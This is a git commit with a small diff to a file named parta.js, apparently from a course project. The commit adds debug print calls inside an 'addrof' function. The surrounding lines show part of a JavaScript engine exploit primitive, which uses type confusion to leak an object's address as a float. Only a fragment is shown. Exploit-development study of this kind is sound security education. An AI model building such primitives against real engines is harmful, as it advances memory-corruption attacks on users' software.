bafd2d41ef3176d84373a68bb0e9d1e450d2ba66
Denis Ivanov <denis.ivanov26@gmail.com>
2022-04-07 20:37:32 -0500

    Update parta.js

--- proj5/parta.js
+++ proj5/parta.js
@@ -5,7 +5,9 @@ let u32 = new Uint32Array(buff);
 let addrof = function(thing){
     let o1 = {"gg" : 1, "ff" : thing};
     // shift the first value plane
+    print(o1);
     o1.eight();
+    print(o1);
     let o = {"hi" : o1.gg, "bye" : 7};
     // shift the second value plane
     // suddenly, value of thing is now tagged with a float!
